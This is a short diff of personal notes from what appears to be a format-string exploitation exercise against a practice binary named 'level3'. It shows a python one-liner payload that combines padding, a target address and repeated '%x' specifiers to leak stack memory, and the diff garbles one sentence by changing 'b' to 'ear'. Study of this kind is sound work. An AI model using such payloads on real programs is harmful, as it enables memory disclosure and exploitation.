@@ -130,5 +130,6 @@ b7ff26b0 b7e453e9 b7ffeff4 1 80483f0 0
 Should be possible out of those addr to calculate "padding" to find m
 
 python -c 'print "AAAAAAAAAAAAAAAAAAAAAA" + "\x8c\x98\x04\x08" + "bbbbbbbbb"  + "%x "*512' | ./level3
-988c4141 --> this value appears in the middle of the A and b
+988c4141 --> this value appears in the middle of the A and ear
+
 
